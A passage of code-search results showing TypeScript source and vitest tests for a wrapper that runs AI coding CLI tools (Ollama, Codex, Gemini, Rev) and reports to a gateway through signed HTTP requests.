     new Promise((_, reject) =>\n          setTimeout(() => reject(new Error('Timeout')), 100)\n        )\n      );\n\n      try {\n        await mockFetch('https://localhost:3100/api/test');\n        expect.fail('Should have thrown');\n      } catch (err: any) {\n        expect(err.message).toBe('Timeout');\n      }\n    });\n  });\n\n  describe('Health Check', () => {\n    it('should return true on successful health check', async () => {\n      mockFetch.mockResolvedValueOnce({\n        ok: true,\n        json: async () => ({ status: 'ok' })\n      });\n\n      const response = await mockFetch('https://localhost:3100/api/health');\n      expect(response.ok).toBe(true);\n    });\n\n    it('should return false on failed health check', async () => {\n      mockFetch.mockResolvedValueOnce({\n        ok: false,\n        status: 500\n      });\n\n      const response = await mockFetch('https://localhost:3100/api/health');\n      expect(response.ok).toBe(false);", "metadata": {"file": "wrapper/src/services/gateway-client.test.ts", "start_line": 1, "end_line": 200, "language": "ts"}}, {"corpus": "code", "source": "wrapper/src/services/gateway-client.test.ts", "location": "wrapper/src/services/gateway-client.test.ts:201", "score": 0.0, "content": "    });\n  });\n});\n\ndescribe('File Upload', () => {\n  it('should create form data for artifact upload', () => {\n    // In Node.js, we'd use form-data package\n    // This tests the structure of what would be sent\n\n    const artifactMeta = {\n      runId: 'test-run',\n      filename: 'test.log',\n      type: 'log',\n      size: 1024\n    };\n\n    expect(artifactMeta.filename).toBe('test.log');\n    expect(artifactMeta.type).toBe('log');\n  });\n});", "metadata": {"file": "wrapper/src/services/gateway-client.test.ts", "start_line": 201, "end_line": 220, "language": "ts"}}, {"corpus": "code", "source": "wrapper/src/services/gateway-client.ts", "location": "wrapper/src/services/gateway-client.ts:1", "score": 0.0, "content": "import fetch from 'node-fetch';\nimport https from 'https';\nimport FormData from 'form-data';\nimport { createReadStream } from 'fs';\nimport { config } from '../config.js';\nimport { createSignature, hashBody, generateNonce } from '../utils/crypto.js';\n\n// Allow self-signed certs in dev\nconst agent = config.allowSelfSignedCerts\n  ? new https.Agent({ rejectUnauthorized: false })\n  : undefined;\n\nexport interface RunAuth {\n  runId: string;\n  capabilityToken: string;\n}\n\nexport interface GatewayEvent {\n  type: 'stdout' | 'stderr' | 'marker' | 'info' | 'error' | 'assist' | 'prompt_waiting' | 'prompt_resolved';\n  data: string;\n  sequence?: number;\n}\n\nexport interface Command {\n  id: string;\n  command: string;\n  created_at: number;\n}\n\n/**\n * Make authenticated request to gateway\n */\nasync function request(\n  method: string,\n  path: string,\n  body?: object | FormData,\n  auth?: RunAuth\n): Promise<any> {\n  const url = `${config.gatewayUrl}${path}`;\n  const timestamp = Math.floor(Date.now() / 1000);\n  const nonce = generateNonce();\n\n  let bodyStr = '';\n  let headers: Record<string, string> = {\n    'X-Timestamp': timestamp.toString(),\n    'X-Nonce': nonce\n  };\n\n  if (auth) {\n    headers['X-Run-Id'] = auth.runId;\n    headers['X-Capability-Token'] = auth.capabilityToken;\n  }\n\n  let fetchBody: string | FormData | undefined;\n\n  if (body instanceof FormData) {\n    // For file uploads, hash the form boundary\n    bodyStr = 'multipart';\n    fetchBody = body;\n    // FormData sets its own content-type with boundary\n  } else if (body) {\n    bodyStr = JSON.stringify(body);\n    headers['Content-Type'] = 'application/json';\n    fetchBody = bodyStr;\n  }\n\n  // Create signature\n  const signature = createSignature({\n    method,\n    path,\n    bodyHash: hashBody(bodyStr),\n    timestamp,\n    nonce,\n    runId: auth?.runId,\n    capabilityToken: auth?.capabilityToken\n  });\n\n  headers['X-Signature'] = signature;\n\n  const response = await fetch(url, {\n    method,\n    headers,\n    body: fetchBody,\n    agent\n  });\n\n  if (!response.ok) {\n    const error = await response.json().catch(() => ({ error: response.statusText }));\n    throw new Error(`Gateway error: ${JSON.stringify(error)}`);\n  }\n\n  return response.json();\n}\n\n/**\n * Send event to gateway\n */\nexport async function sendEvent(auth: RunAuth, event: GatewayEvent): Promise<void> {\n  await request('POST', '/api/ingest/event', event, auth);\n}\n\n/**\n * Upload artifact to gateway\n */\nexport async function uploadArtifact(\n  auth: RunAuth,\n  filePath: string,\n  fileName: string\n): Promise<{ artifactId: string }> {\n  const form = new FormData();\n  form.append('file', createReadStream(filePath), fileName);\n\n  return request('POST', '/api/ingest/artifact', form, auth);\n}\n\n/**\n * Poll for pending commands\n */\nexport async function pollCommands(auth: RunAuth): Promise<Command[]> {\n  return request('GET', `/api/runs/${auth.runId}/commands`, undefined, auth);\n}\n\n/**\n * Acknowledge command completion\n */\nexport async function ackCommand(\n  auth: RunAuth,\n  commandId: string,\n  result?: string,\n  error?: string\n): Promise<void> {\n  await request(\n    'POST',\n    `/api/runs/${auth.runId}/commands/${commandId}/ack`,\n    { result, error },\n    auth\n  );\n}\n\n/**\n * Test gateway connectivity\n */\nexport async function testConnection(): Promise<boolean> {\n  try {\n    const response = await fetch(`${config.gatewayUrl}/api/health`, { agent });\n    return response.ok;\n  } catch {\n    return false;\n  }\n}\n\n/**\n * Update run state (for resume functionality)\n */\nexport async function updateRunState(\n  auth: RunAuth,\n  state: {\n    workingDir?: string;\n    lastSequence?: number;\n    stdinBuffer?: string;\n    environment?: Record<string, string>;\n  }\n): Promise<void> {\n  await request('POST', `/api/runs/${auth.runId}/state`, state, auth);\n}\n\n/**\n * List runs from gateway (requires UI auth, but can be called with wrapper for status)\n */\nexport interface RunInfo {\n  id: string;\n  status: 'pending' | 'running' | 'done' | 'failed';\n  command: string | null;\n  created_at: number;\n  started_at: number | null;\n  finished_at: number | null;\n  exit_code: number | null;\n  metadata: Record<string, any> | null;\n}\n\nexport interface ListRunsResponse {\n  runs: RunInfo[];\n  pagination: {\n    total: number;\n    limit: number;\n    offset: number;\n    hasMore: boolean;\n  };\n}\n\n/**\n * Request authenticated endpoint for UI operations\n * Note: These require UI session auth, typically called from CLI with stored credentials\n */\nexport interface UIAuth {\n  sessionToken: string;\n}\n\nasync function uiRequest(\n  method: string,", "metadata": {"file": "wrapper/src/services/gateway-client.ts", "start_line": 1, "end_line": 200, "language": "ts"}}, {"corpus": "code", "source": "wrapper/src/services/gateway-client.ts", "location": "wrapper/src/services/gateway-client.ts:201", "score": 0.0, "content": "  path: string,\n  body?: object,\n  auth?: UIAuth\n): Promise<any> {\n  const url = `${config.gatewayUrl}${path}`;\n\n  const headers: Record<string, string> = {};\n\n  if (auth?.sessionToken) {\n    headers['Authorization'] = `Bearer ${auth.sessionToken}`;\n  }\n\n  if (body) {\n    headers['Content-Type'] = 'application/json';\n  }\n\n  const response = await fetch(url, {\n    method,\n    headers,\n    body: body ? JSON.stringify(body) : undefined,\n    agent\n  });\n\n  if (!response.ok) {\n    const error = await response.json().catch(() => ({ error: response.statusText }));\n    throw new Error(`Gateway error: ${JSON.stringify(error)}`);\n  }\n\n  return response.json();\n}\n\nexport async function listRuns(\n  auth: UIAuth,\n  options?: { status?: string; limit?: number; offset?: number; search?: string }\n): Promise<ListRunsResponse> {\n  const params = new URLSearchParams();\n  if (options?.status) params.append('status', options.status);\n  if (options?.limit) params.append('limit', options.limit.toString());\n  if (options?.offset) params.append('offset', options.offset.toString());\n  if (options?.search) params.append('search', options.search);\n\n  const queryString = params.toString();\n  const path = `/api/runs${queryString ? `?${queryString}` : ''}`;\n\n  return uiRequest('GET', path, undefined, auth);\n}\n\nexport async function getRun(auth: UIAuth, runId: string): Promise<RunInfo & { artifacts: any[] }> {\n  return uiRequest('GET', `/api/runs/${runId}`, undefined, auth);\n}\n\nexport async function getRunState(auth: UIAuth, runId: string): Promise<{\n  run: RunInfo;\n  state: {\n    working_dir: string;\n    original_command: string | null;\n    last_sequence: number;\n    stdin_buffer: string | null;\n    environment: string | null;\n  } | null;\n  recentEvents: any[];\n  canResume: boolean;\n}> {\n  return uiRequest('GET', `/api/runs/${runId}/state`, undefined, auth);\n}\n\nexport async function createRun(\n  auth: UIAuth,\n  options: {\n    command?: string;\n    metadata?: Record<string, any>;\n    workingDir?: string;\n    autonomous?: boolean;\n    workerType?: string;\n    model?: string;\n  }\n): Promise<{ id: string; capabilityToken: string; status: string; autonomous?: boolean }> {\n  return uiRequest('POST', '/api/runs', options, auth);\n}\n\nexport async function stopRun(auth: UIAuth, runId: string): Promise<{ ok: boolean; commandId: string }> {\n  return uiRequest('POST', `/api/runs/${runId}/stop`, {}, auth);\n}\n\nexport async function haltRun(auth: UIAuth, runId: string): Promise<{ ok: boolean; commandId: string }> {\n  return uiRequest('POST', `/api/runs/${runId}/halt`, {}, auth);\n}\n\nexport async function restartRun(\n  auth: UIAuth,\n  runId: string,\n  options?: { command?: string; workingDir?: string }\n): Promise<{ id: string; capabilityToken: string; status: string; restartedFrom: string }> {\n  return uiRequest('POST', `/api/runs/${runId}/restart`, options || {}, auth);\n}\n\nexport async function sendInput(\n  auth: UIAuth,\n  runId: string,\n  input: string,\n  escape?: boolean\n): Promise<{ ok: boolean; commandId: string }> {\n  return uiRequest('POST', `/api/runs/${runId}/input`, { input, escape }, auth);\n}\n\nexport async function sendEscape(\n  auth: UIAuth,\n  runId: string\n): Promise<{ ok: boolean; commandId: string }> {\n  return uiRequest('POST', `/api/runs/${runId}/escape`, {}, auth);\n}\n\n/**\n * Login to get UI session token\n */\nexport async function login(\n  username: string,\n  password: string,\n  totpCode?: string\n): Promise<{ token: string; user: { id: string; username: string; role: string } }> {\n  return uiRequest('POST', '/api/auth/login', { username, password, totpCode });\n}\n\n/**\n * Check auth status\n */\nexport async function getAuthStatus(): Promise<{ needsSetup: boolean }> {\n  return uiRequest('GET', '/api/auth/status');\n}", "metadata": {"file": "wrapper/src/services/gateway-client.ts", "start_line": 201, "end_line": 329, "language": "ts"}}, {"corpus": "code", "source": "wrapper/src/services/generic-runner.test.ts", "location": "wrapper/src/services/generic-runner.test.ts:1", "score": 0.0, "content": "import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';\n\n// Mock config\nvi.mock('../config.js', () => ({\n  config: {\n    projectRoot: '/test/project',\n    runsDir: '/test/project/.data/runs',\n    claudeCommand: 'claude',\n    ollamaCommand: 'ollama',\n    ollamaModel: 'codellama:7b',\n    codexCommand: 'codex-cli',\n    geminiCommand: 'gemini-cli',\n    geminiModel: 'gemini-pro',\n    revCommand: 'rev',\n    commandPollInterval: 2000,\n    heartbeatInterval: 30000,\n    allowlistedCommands: ['npm test', 'cd', 'ls', 'pwd'],\n    secretPatterns: [/api[_-]?key[=:]\\s*[\"']?[\\w-]+[\"']?/gi],\n    getWorkerCommand: (workerType: string) => {\n      const commands: Record<string, string> = {\n        claude: 'claude',\n        ollama: 'ollama',\n        'ollama-launch': 'ollama',\n        codex: 'codex-cli',\n        gemini: 'gemini-cli',\n        rev: 'rev'\n      };\n      return commands[workerType] || workerType;\n    },\n    getDefaultModel: (workerType: string) => {\n      const models: Record<string, string | undefined> = {\n        ollama: 'codellama:7b',\n        'ollama-launch': 'claude',\n        gemini: 'gemini-pro'\n      };\n      return models[workerType];\n    }\n  }\n}));\n\n// Mock fs\nvi.mock('fs', () => ({\n  existsSync: vi.fn(),\n  mkdirSync: vi.fn(),\n  writeFileSync: vi.fn(),\n  readFileSync: vi.fn(),\n  createWriteStream: vi.fn(() => ({\n    write: vi.fn(),\n    end: vi.fn()\n  }))\n}));\n\n// Mock child_process\nvi.mock('child_process', () => ({\n  spawn: vi.fn(),\n  execSync: vi.fn()\n}));\n\n// Mock gateway client\nvi.mock('./gateway-client.js', () => ({\n  sendEvent: vi.fn().mockResolvedValue(undefined),\n  uploadArtifact: vi.fn().mockResolvedValue({ artifactId: 'test' }),\n  pollCommands: vi.fn().mockResolvedValue([]),\n  ackCommand: vi.fn().mockResolvedValue(undefined),\n  updateRunState: vi.fn().mockResolvedValue(undefined)\n}));\n\nimport { config } from '../config.js';\nimport { GenericRunner, createGenericRunner } from './generic-runner.js';\nimport type { WorkerType } from './worker-registry.js';\n\ndescribe('GenericRunner', () => {\n  beforeEach(() => {\n    vi.clearAllMocks();\n  });\n\n  describe('Runner Creation', () => {\n    it('should create runner for Ollama', () => {\n      const runner = new GenericRunner({\n        runId: 'test-run-1',\n        capabilityToken: 'token-abc',\n        workingDir: '/test/project',\n        autonomous: false,\n        workerType: 'ollama-launch',\n        model: 'codellama:7b'\n      });\n\n      expect(runner.getWorkerType()).toBe('ollama-launch');\n    });\n\n    it('should create runner for Ollama Launch', () => {\n      const runner = new GenericRunner({\n        runId: 'test-run-2',\n        capabilityToken: 'token-xyz',\n        workingDir: '/test/project',\n        autonomous: false,\n        workerType: 'ollama-launch',\n        model: 'claude'\n      });\n\n      expect(runner.getWorkerType()).toBe('ollama-launch');\n    });\n\n    it('should create runner for Codex', () => {\n      const runner = createGenericRunner('codex', {\n        runId: 'test-run-3',\n        capabilityToken: 'token-codex',\n        workingDir: '/test/project',\n        autonomous: false\n      });\n\n      expect(runner.getWorkerType()).toBe('codex');\n    });\n\n    it('should create runner for Gemini', () => {\n      const runner = createGenericRunner('gemini', {\n        runId: 'test-run-4',\n        capabilityToken: 'token-gemini',\n        workingDir: '/test/project',\n        autonomous: false,\n        model: 'gemini-pro'\n      });\n\n      expect(runner.getWorkerType()).toBe('gemini');\n    });\n\n    it('should create runner for Rev', () => {\n      const runner = createGenericRunner('rev', {\n        runId: 'test-run-5',\n        capabilityToken: 'token-rev',\n        workingDir: '/test/project',\n        autonomous: false\n      });\n\n      expect(runner.getWorkerType()).toBe('rev');\n    });\n  });\n\n  describe('Command Building', () => {\n    it('should build Ollama launch command with custom model', () => {\n      const runner = new GenericRunner({\n        runId: 'test-run',\n        capabilityToken: 'token',\n        workingDir: '/test/project',\n        autonomous: false,\n        workerType: 'ollama-launch',\n        model: 'codellama:13b'\n      });\n\n      const result = runner.buildCommand('explain this code', false);\n      // In launch mode, command is sent via stdin, not as CLI args\n      expect(result.args).toEqual(['launch', 'claude', '--model', 'codellama:13b']);\n      expect(result.fullCommand).toBe('ollama launch claude --model codellama:13b');\n    });\n\n    it('should build Ollama launch command with default model', () => {\n      const runner = new GenericRunner({\n        runId: 'test-run',\n        capabilityToken: 'token',\n        workingDir: '/test/project',\n        autonomous: false,\n        workerType: 'ollama-launch'\n        // no model specified\n      });\n\n      const result = runner.buildCommand('test prompt', false);\n      // In launch mode without model, no --model flag is added\n      expect(result.args).toEqual(['launch', 'claude']);\n      expect(result.fullCommand).toBe('ollama launch claude');\n    });\n\n    it('should build Ollama launch command', () => {\n      const runner = new GenericRunner({\n        runId: 'test-run',\n        capabilityToken: 'token',\n        workingDir: '/test/project',\n        autonomous: true,\n        workerType: 'ollama-launch',\n        model: 'claude'\n      });\n\n      const result = runner.buildCommand('fix bug', true);\n      // In launch mode, command is sent via stdin, model is passed with --model flag\n      expect(result.args).toEqual(['launch', 'claude', '--model', 'claude']);\n      expect(result.fullCommand).toBe('ollama launch claude --model claude');\n    });\n\n    it('should build Ollama launch command without model flag when no model', () => {\n      const runner = new GenericRunner({\n        runId: 'test-run',\n        capabilityToken: 'token',\n        workingDir: '/test/project',\n        autonomous: false,\n        workerType: 'ollama-launch'\n      });\n\n      const result = runner.buildCommand('fix bug', false);\n      // In launch mode without explicit model\n      expect(result.args).toEqual(['launch', 'claude']);\n      expect(result.fullCommand).toBe('ollama launch claude');", "metadata": {"file": "wrapper/src/services/generic-runner.test.ts", "start_line": 1, "end_line": 200, "language": "ts"}}, {"corpus": "code", "source": "wrapper/src/services/generic-runner.test.ts", "location": "wrapper/src/services/generic-runner.test.ts:201", "score": 0.0, "content": "    });\n\n    it('should build Codex command', () => {\n      const runner = new GenericRunner({\n        runId: 'test-run',\n        capabilityToken: 'token',\n        workingDir: '/test/project',\n        autonomous: false,\n        workerType: 'codex'\n      });\n\n      const result = runner.buildCommand('write tests', false);\n      expect(result.args).toEqual(['write tests']);\n      expect(result.fullCommand).toBe('codex-cli write tests');\n    });\n\n    it('should build Codex command without prompt', () => {\n      const runner = new GenericRunner({\n        runId: 'test-run',\n        capabilityToken: 'token',\n        workingDir: '/test/project',\n        autonomous: false,\n        workerType: 'codex'\n      });\n\n      const result = runner.buildCommand(undefined, false);\n      expect(result.args).toEqual([]);\n      expect(result.fullCommand).toBe('codex-cli');\n    });\n\n    it('should build Gemini command with model', () => {\n      const runner = new GenericRunner({\n        runId: 'test-run',\n        capabilityToken: 'token',\n        workingDir: '/test/project',\n        autonomous: false,\n        workerType: 'gemini',\n        model: 'gemini-1.5-pro'\n      });\n\n      const result = runner.buildCommand('refactor', false);\n      expect(result.args).toEqual(['--model', 'gemini-1.5-pro', 'refactor']);\n      expect(result.fullCommand).toBe('gemini-cli --model gemini-1.5-pro refactor');\n    });\n\n    it('should build Rev command', () => {\n      const runner = new GenericRunner({\n        runId: 'test-run',\n        capabilityToken: 'token',\n        workingDir: '/test/project',\n        autonomous: false,\n        workerType: 'rev'\n      });\n\n      const result = runner.buildCommand('analyze', false);\n      expect(result.args).toEqual(['analyze']);\n      expect(result.fullCommand).toBe('rev analyze');\n    });\n\n    it('should handle empty command for autonomous mode', () => {\n      const runner = new GenericRunner({\n        runId: 'test-run',\n        capabilityToken: 'token',\n        workingDir: '/test/project',\n        autonomous: true,\n        workerType: 'ollama-launch'\n      });\n\n      const result = runner.buildCommand(undefined, true);\n      // In launch mode without model\n      expect(result.args).toEqual(['launch', 'claude']);\n      expect(result.fullCommand).toBe('ollama launch claude');\n    });\n  });\n\n  describe('Get Command', () => {\n    it('should return correct command for each worker type', () => {\n      const ollamaRunner = new GenericRunner({\n        runId: 'test',\n        capabilityToken: 'token',\n        workerType: 'ollama-launch'\n      });\n      expect(ollamaRunner.getCommand()).toBe('ollama');\n\n      const codexRunner = new GenericRunner({\n        runId: 'test',\n        capabilityToken: 'token',\n        workerType: 'codex'\n      });\n      expect(codexRunner.getCommand()).toBe('codex-cli');\n\n      const geminiRunner = new GenericRunner({\n        runId: 'test',\n        capabilityToken: 'token',\n        workerType: 'gemini'\n      });\n      expect(geminiRunner.getCommand()).toBe('gemini-cli');\n    });\n  });\n\n  describe('Environment Variables', () => {\n    it('should build Ollama environment with OLLAMA_HOST', () => {\n      const runner = new GenericRunner({\n        runId: 'test',\n        capabilityToken: 'token',\n        workerType: 'ollama-launch',\n        model: 'codellama:7b'\n      });\n\n      const env = runner['buildEnvironment']();\n      expect(env).toBeDefined();\n      expect(env.OLLAMA_HOST).toBeDefined();\n      expect(env.OLLAMA_HOST).toBe('http://localhost:11434');\n    });\n\n    it('should build Codex environment with API keys', () => {\n      const runner = new GenericRunner({\n        runId: 'test',\n        capabilityToken: 'token',\n        workerType: 'codex'\n      });\n\n      const env = runner['buildEnvironment']();\n      expect(env).toBeDefined();\n      expect(env.OPENAI_API_KEY).toBe('');\n      expect(env.CODEX_API_KEY).toBe('');\n    });\n\n    it('should build Gemini environment with API keys', () => {\n      const runner = new GenericRunner({\n        runId: 'test',\n        capabilityToken: 'token',\n        workerType: 'gemini'\n      });\n\n      const env = runner['buildEnvironment']();\n      expect(env).toBeDefined();\n      expect(env.GOOGLE_API_KEY).toBe('');\n      expect(env.GEMINI_API_KEY).toBe('');\n    });\n\n    it('should build Rev environment with API key', () => {\n      const runner = new GenericRunner({\n        runId: 'test',\n        capabilityToken: 'token',\n        workerType: 'rev'\n      });\n\n      const env = runner['buildEnvironment']();\n      expect(env).toBeDefined();\n      expect(env.REV_API_KEY).toBe('');\n    });\n  });\n\n  describe('Custom Command Builder', () => {\n    it('should use custom buildCommandFn if provided', () => {\n      const customBuilder = vi.fn(() => ({\n        args: ['custom', 'args'],\n        fullCommand: 'custom command'\n      }));\n\n      const runner = new GenericRunner({\n        runId: 'test',\n        capabilityToken: 'token',\n        workingDir: '/test',\n        workerType: 'ollama-launch',\n        buildCommandFn: customBuilder\n      });\n\n      const result = runner.buildCommand('test', false);\n      expect(customBuilder).toHaveBeenCalledWith('test', false, undefined);\n      expect(result.fullCommand).toBe('custom command');\n    });\n  });\n});\n\ndescribe('GenericRunner Edge Cases', () => {\n  it('should handle empty model for workers that support it', () => {\n    const runner = new GenericRunner({\n      runId: 'test',\n      capabilityToken: 'token',\n      workerType: 'ollama-launch'\n      // model not specified\n    });\n\n    const result = runner.buildCommand('test', false);\n    // Integration is 'claude' by default, no --model flag when model is not specified\n    expect(result.args).toEqual(['launch', 'claude']);\n  });\n\n  it('should handle long commands', () => {\n    const runner = new GenericRunner({\n      runId: 'test',\n      capabilityToken: 'token',\n      workerType: 'codex'\n    });\n\n    const longCmd = 'write a comprehensive unit test suite for the authentication module including edge cases like expired tokens, invalid passwords, and rate limiting';\n    const result = runner.buildCommand(longCmd, false);\n    expect(result.args).toEqual([longCmd]);", "metadata": {"file": "wrapper/src/services/generic-runner.test.ts", "start_line": 201, "end_line": 400, "language": "ts"}}, {"corpus": "code", "source": "wrapper/src/services/generic-runner.test.ts", "location": "wrapper/src/services/generic-runner.test.ts:401", "score": 0.0, "content": "  });\n\n  it('should handle commands with special characters', () => {\n    const runner = new GenericRunner({\n      runId: 'test',\n      capabilityToken: 'token',\n      workerType: 'ollama-launch',\n      model: 'custom-model'\n    });\n\n    const result = runner.buildCommand('test \"quoted\" command', false);\n    // In launch mode, model is passed with --model flag\n    expect(result.args).toEqual(['launch', 'claude', '--model', 'custom-model']);\n  });\n});", "metadata": {"file": "wrapper/src/services/generic-runner.test.ts", "start_line": 401, "end_line": 415, "language": "ts"}}, {"corpus": "code", "source": "wrapper/src/services/generic-runner.ts", "location": "wrapper/src/services/generic-runner.ts:1", "score": 0.0, "content": "import { BaseRunner, RunnerOptions, WorkerCommandResult } from './base-runner.js';\nimport { getWorkerCommand, getWorkerConfig, type WorkerType } from './worker-registry.js';\nimport { config } from '../config.js';\n\n/**\n * Options specific to GenericRunner\n */\nexport interface GenericRunnerOptions extends RunnerOptions {\n  workerType: WorkerType;\n  // Optional: override the command to execute (for worker-specific command structures)\n  commandPrefix?: string[];\n  // Optional: custom command building function\n  buildCommandFn?: (command?: string, autonomous?: boolean, model?: string) => WorkerCommandResult;\n  // Optional: integration for ollama-launch (claude, codex, opencode, droid)\n  integration?: string;\n}\n\n/**\n * Generic CLI worker that works with any CLI tool\n * Supports various AI coding tools through a configurable interface\n */\nexport class GenericRunner extends BaseRunner {\n  private workerType: WorkerType;\n  private commandPrefix?: string[];\n  private buildCommandFn?: (command?: string, autonomous?: boolean, model?: string) => WorkerCommandResult;\n  private initialCommand?: string; // Store initial command for stdin-based execution\n\n  constructor(options: GenericRunnerOptions) {\n    super(options);\n    this.workerType = options.workerType;\n    this.commandPrefix = options.commandPrefix;\n    this.buildCommandFn = options.buildCommandFn;\n    // Set integration from options, with fallback to base runner's integration\n    if (options.integration) {\n      this.integration = options.integration;\n    }\n  }\n\n  /**\n   * Get the worker type identifier\n   */\n  getWorkerType(): string {\n    return this.workerType;\n  }\n\n  /**\n   * Get the CLI command for this worker\n   */\n  getCommand(): string {\n    if (this.commandPrefix && this.commandPrefix.length > 0) {\n      return this.commandPrefix[0];\n    }\n    return config.getWorkerCommand(this.workerType);\n  }\n\n  /**\n   * Override start to handle sending initial command via stdin for ollama-launch\n   */\n  async start(command?: string): Promise<void> {\n    // Store the initial command for ollama-launch to send via stdin\n    if (this.workerType === 'ollama-launch' && command) {\n      this.initialCommand = command;\n    }\n\n    // Call parent start method\n    await super.start(command);\n\n    // For ollama-launch, send the initial command via stdin after process starts\n    if (this.workerType === 'ollama-launch' && this.initialCommand) {\n      // Delay to ensure ollama launch process is fully initialized\n      // ollama launch can take a moment to set up the integration\n      await new Promise(resolve => setTimeout(resolve, 2000));\n\n      if (this.sendInput(this.initialCommand + '\\n')) {\n        console.log('Sent initial command to ollama launch process via stdin');\n      } else {\n        console.log('Failed to send initial command to ollama launch - process may not have stdin available yet');\n      }\n    }\n  }\n\n  /**\n   * Build command arguments based on worker type\n   */\n  buildCommand(command?: string, autonomous?: boolean): WorkerCommandResult {\n    // Use custom command builder if provided\n    if (this.buildCommandFn) {\n      return this.buildCommandFn(command, autonomous, this.model);\n    }\n\n    // Get the worker config to check for subcommand\n    const workerConfig = getWorkerConfig(this.workerType);\n    const subcommand = workerConfig?.subcommand;\n\n    // Otherwise, use worker-specific command building\n    switch (this.workerType) {\n      case 'ollama-launch':\n        return this.buildOllamaCommand(command, autonomous, subcommand);\n      case 'codex':\n        return this.buildCodexCommand(command, autonomous);\n      case 'gemini':\n        return this.buildGeminiCommand(command, autonomous);\n      case 'rev':\n        return this.buildRevCommand(command, autonomous);\n      default:\n        // Fallback: treat command as direct argument\n        return {\n          args: command ? [command] : [],\n          fullCommand: command || this.getCommand()\n        };\n    }\n  }\n\n  /**\n   * Build Ollama command\n   * Usage: ollama run <model> [prompt] or ollama launch <integration> --model <model>\n   * Note: For 'launch' mode, the initial command is sent via stdin, not as CLI args\n   * Integrations: claude, opencode, codex, droid\n   */\n  private buildOllamaCommand(command?: string, autonomous?: boolean, subcommand: string = 'run'): WorkerCommandResult {\n    const args = [subcommand];\n\n    if (subcommand === 'run') {\n      // For 'run' mode: ollama run <model> [prompt]\n      const model = this.model || config.ollamaModel;\n      args.push(model);\n\n      if (command) {\n        args.push(command);\n      }\n    } else if (subcommand === 'launch') {\n      // For 'launch' mode: ollama launch <integration> --model <model>\n      // integration: claude, opencode, codex, droid\n      const integration = this.integration || 'claude';\n      args.push(integration);\n\n      // Add --model flag with the specific model\n      if (this.model) {\n        args.push('--model', this.model);\n      }\n    }\n\n    const fullCommand = `${this.getCommand()} ${args.join(' ')}`;\n    return { args, fullCommand };\n  }\n\n  /**\n   * Build Codex CLI command\n   * Usage: codex-cli <prompt>\n   */\n  private buildCodexCommand(command?: string, autonomous?: boolean): WorkerCommandResult {\n    const args = command ? [command] : [];\n\n    if (!command && autonomous) {\n      // For autonomous mode, Codex CLI may need specific flags\n      // This depends on the actual Codex CLI implementation\n    }\n\n    const fullCommand = command\n      ? `${this.getCommand()} ${command}`\n      : this.getCommand();\n\n    return { args, fullCommand };\n  }\n\n  /**\n   * Build Gemini CLI command\n   * Usage: gemini-cli --model <model> [prompt]\n   */\n  private buildGeminiCommand(command?: string, autonomous?: boolean): WorkerCommandResult {\n    const model = this.model || config.geminiModel;\n    const args = ['--model', model];\n\n    if (command) {\n      args.push(command);\n    }\n\n    const fullCommand = `${this.getCommand()} ${args.join(' ')}`;\n    return { args, fullCommand };\n  }\n\n  /**\n   * Build Rev command\n   * Usage: rev <prompt>\n   */\n  private buildRevCommand(command?: string, autonomous?: boolean): WorkerCommandResult {\n    const args = command ? [command] : [];\n\n    const fullCommand = command\n      ? `${this.getCommand()} ${command}`\n      : this.getCommand();\n\n    return { args, fullCommand };\n  }\n\n  /**\n   * Build environment variables (can be overridden for worker-specific needs)\n   */\n  protected buildEnvironment(): NodeJS.ProcessEnv {\n    const baseEnv = super.buildEnvironment();", "metadata": {"file": "wrapper/src/services/generic-runner.ts", "start_line": 1, "end_line": 200, "language": "ts"}}, {"corpus": "code", "source": "wrapper/src/services/generic-runner.ts", "location": "wrapper/src/services/generic-runner.ts:201", "score": 0.0, "content": "\n    // Worker-specific environment variables\n    switch (this.workerType) {\n      case 'ollama-launch':\n        // Ollama-specific env vars\n        return {\n          ...baseEnv,\n          OLLAMA_HOST: process.env.OLLAMA_HOST || 'http://localhost:11434'\n        };\n\n      case 'codex':\n        // Codex-specific env vars (API keys, etc.)\n        return {\n          ...baseEnv,\n          OPENAI_API_KEY: process.env.OPENAI_API_KEY || '',\n          CODEX_API_KEY: process.env.CODEX_API_KEY || ''\n        };\n\n      case 'gemini':\n        // Gemini-specific env vars\n        return {\n          ...baseEnv,\n          GOOGLE_API_KEY: process.env.GOOGLE_API_KEY || '',\n          GEMINI_API_KEY: process.env.GEMINI_API_KEY || ''\n        };\n\n      case 'rev':\n        // Rev-specific env vars\n        return {\n          ...baseEnv,\n          REV_API_KEY: process.env.REV_API_KEY || ''\n        };\n\n      default:\n        return baseEnv;\n    }\n  }\n}\n\n/**\n * Factory function to create a GenericRunner for a specific worker type\n */\nexport function createGenericRunner(workerType: WorkerType, options: Omit<RunnerOptions, 'runId' | 'capabilityToken'> & {\n  runId: string;\n  capabilityToken: string;\n}): GenericRunner {\n  return new GenericRunner({\n    ...options,\n    workerType\n  });\n}", "metadata": {"file": "wrapper/src/services/generic-runner.ts", "start_line": 201, "end_line": 251, "language": "ts"}}, {"corpus": "code", "source": "wrapper/src/services/worker-registry.test.ts", "location": "wrapper/src/services/worker-registry.test.ts:1", "score": 0.0, "content": "import { describe, it, expect, vi, beforeEach } from 'vitest';\n\n// Mock config\nvi.mock('../config.js', () => ({\n  config: {\n    projectRoot: '/test/project',\n    claudeCommand: 'claude',\n    ollamaCommand: 'ollama',\n    ollamaModel: 'codellama:7b',\n    codexCommand: 'codex-cli',\n    geminiCommand: 'gemini-cli',\n    geminiModel: 'gemini-pro',\n    revCommand: 'rev'\n  }\n}));\n\nimport {\n  WORKER_CONFIGS,\n  type WorkerType,\n  getWorkerConfig,\n  getWorkerCommand,\n  getDefaultModel,\n  isValidWorkerType,\n  getAllWorkerTypes,\n  getWorkerDisplayName,\n  getWorkerIcon,\n  GEMINI_MODELS\n} from './worker-registry.js';\n\ndescribe('Worker Registry', () => {\n  describe('Worker Configuration', () => {\n    it('should have all worker types configured', () => {\n      const workerTypes: WorkerType[] = ['claude', 'ollama-launch', 'codex', 'gemini', 'rev'];\n\n      for (const type of workerTypes) {\n        expect(WORKER_CONFIGS[type]).toBeDefined();\n        expect(WORKER_CONFIGS[type].type).toBe(type);\n      }\n    });\n\n    it('should have correct worker type for Claude', () => {\n      const claude = WORKER_CONFIGS.claude;\n      expect(claude.type).toBe('claude');\n      expect(claude.command).toBe('claude');\n      expect(claude.displayName).toBe('Claude');\n      expect(claude.supportsModelSelection).toBe(false);\n      expect(claude.description).toContain('Anthropic');\n    });\n\n    it('should have correct worker type for Ollama Launch', () => {\n      const ollamaLaunch = 